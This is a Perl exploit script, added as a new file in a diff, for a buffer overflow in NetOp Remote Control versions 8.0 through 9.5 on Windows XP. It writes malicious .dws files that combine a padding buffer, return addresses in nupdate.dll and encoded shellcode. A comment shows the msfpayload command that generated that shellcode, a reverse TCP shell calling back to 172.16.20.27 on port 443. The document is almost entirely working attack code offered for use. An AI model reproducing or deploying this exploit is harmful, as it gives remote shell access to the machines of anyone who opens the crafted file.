@@ -1,0 +1,132 @@
+# Exploit Title: NetOp Remote Control Buffer Overflow
+# Date: April 28, 2011
+# Author: chap0 
+# Version: 8.0, 9.1, 9.2, 9.5 (Possibly anything before ver 10)
+# Upgrade to Version 10 for fix
+# Tested on: Windows XP SP3
+#  
+# Greetz to JJ IE by day Ninja by night, br34dcrumb5, myne-us, Exploit-DB, Corelan
+# 
+# 
+#!/usr/bin/perl
+
+$file0 = "netop80.dws";
+$file1 = "netop91.dws";
+$file2 = "netop92.dws";
+$file3 = "netop95.dws";
+
+my $junk="\x41" x 524;
+
+my $ret0 = "\x9B\xC2\x40\x20"; #0x2040C29B [nupdate.dll]		
+my $ret1 = "\xB3\xE9\x3D\x20"; #0x203DE9B3 [nupdate.dll]
+my $ret2 = "\x1B\xFC\x44\x20"; #0x2044FC1B [nupdate.dll]
+my $ret3 = "\x13\x26\xB5\x20"; #0x20B52613 [nupdate.dll]
+
+my $extra = "\x41" x 20;
+
+#./msfpayload windows/shell_reverse_tcp LHOST=172.16.20.27 LPORT=443 R | msfencode -a x86 -b '\x00\x0a\x0d' -t perl
+#[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
+
+my $shellcode= "\xb8\x34\xc1\xf5\xcc\xdb\xd1\xd9\x74\x24\xf4\x5a\x33\xc9" .
+"\xb1\x4f\x31\x42\x14\x03\x42\x14\x83\xc2\x04\xd6\x34\x09" .
+"\x24\x9f\xb7\xf2\xb5\xff\x3e\x17\x84\x2d\x24\x53\xb5\xe1" .
+"\x2e\x31\x36\x8a\x63\xa2\xcd\xfe\xab\xc5\x66\xb4\x8d\xe8" .
+"\x77\x79\x12\xa6\xb4\x18\xee\xb5\xe8\xfa\xcf\x75\xfd\xfb" .
+"\x08\x6b\x0e\xa9\xc1\xe7\xbd\x5d\x65\xb5\x7d\x5c\xa9\xb1" .
+"\x3e\x26\xcc\x06\xca\x9c\xcf\x56\x63\xab\x98\x4e\x0f\xf3" .
+"\x38\x6e\xdc\xe0\x05\x39\x69\xd2\xfe\xb8\xbb\x2b\xfe\x8a" .
+"\x83\xe7\xc1\x22\x0e\xf6\x06\x84\xf1\x8d\x7c\xf6\x8c\x95" .
+"\x46\x84\x4a\x10\x5b\x2e\x18\x82\xbf\xce\xcd\x54\x4b\xdc" .
+"\xba\x13\x13\xc1\x3d\xf0\x2f\xfd\xb6\xf7\xff\x77\x8c\xd3" .
+"\xdb\xdc\x56\x7a\x7d\xb9\x39\x83\x9d\x65\xe5\x21\xd5\x84" .
+"\xf2\x53\xb4\xc0\x37\x69\x47\x11\x50\xfa\x34\x23\xff\x50" .
+"\xd3\x0f\x88\x7e\x24\x6f\xa3\xc6\xba\x8e\x4c\x36\x92\x54" .
+"\x18\x66\x8c\x7d\x21\xed\x4c\x81\xf4\xa1\x1c\x2d\xa7\x01" .
+"\xcd\x8d\x17\xe9\x07\x02\x47\x09\x28\xc8\xfe\x0e\xbf\x5f" .
+"\x10\x84\x5b\xc8\x13\xa4\x5a\xb3\x9d\x42\x36\xd3\xcb\xdd" .
+"\xaf\x4a\x56\x95\x4e\x92\x4c\x3d\xf2\x01\x0b\xbd\x7d\x3a" .
+"\x84\xea\x2a\x8c\xdd\x7e\xc7\xb7\x77\x9c\x1a\x21\xbf\x24" .
+"\xc1\x92\x3e\xa5\x84\xaf\x64\xb5\x50\x2f\x21\xe1\x0c\x66" .
+"\xff\x5f\xeb\xd0\xb1\x09\xa5\x8f\x1b\xdd\x30\xfc\x9b\x9b" .
+"\x3c\x29\x6a\x43\x8c\x84\x2b\x7c\x21\x41\xbc\x05\x5f\xf1" .
+"\x43\xdc\xdb\x01\x0e\x7c\x4d\x8a\xd7\x15\xcf\xd7\xe7\xc0" .
+"\x0c\xee\x6b\xe0\xec\x15\x73\x81\xe9\x52\x33\x7a\x80\xcb" .
+"\xd6\x7c\x37\xeb\xf2";
+
+print<<EOF;
+		    NetOp Remote Control Buffer Overflow
+			By chap0 - www.seek-truth.net
+	Choose a number for the version of NetOp are you attacking:
+		0 - NetOp 8.0
+		1 - NetOp 9.1
+		2 - NetOp 9.2
+		3 - Netop 9.5
+		
+EOF
+
+print "Selection: ";
+chomp ($select = <STDIN>);
+
+if ($select =~ 0) {
+
+print "Creating payload for NetOp 8.0\n";
+
+my $payload=$junk.$ret0.$extra.$shellcode;
+
+open(FILE,">$file0");
+print FILE $payload;
+close(FILE);
+
+print "Done.\n";
+
+}
+
+
+elsif ($select =~ 1) {
+
+print "Creating payload for NetOp 9.1\n";
+
+my $payload=$junk.$ret1.$extra.$shellcode;
+
+open(FILE,">$file1");
+print FILE $payload;
+close(FILE);
+
+print "Done.\n";
+
+}
+
+
+elsif ($select =~ 2) {
+
+print "Creating payload for NetOp 9.2\n";
+
+my $payload=$junk.$ret2.$extra.$shellcode;
+
+open(FILE,">$file2");
+print FILE $payload;
+close(FILE);
+
+print "Done.\n";
+
+}
+
+elsif ($select =~ 3) {
+
+print "Creating payload for NetOp 9.5\n";
+
+my $payload=$junk.$ret3.$extra.$shellcode;
+
+open(FILE,">$file3");
+print FILE $payload;
+close(FILE);
+
+print "Done.\n";
+
+}
+
+elsif ($select =~ '') {
+
+print "Please make a selection.\n"; 
+
+}
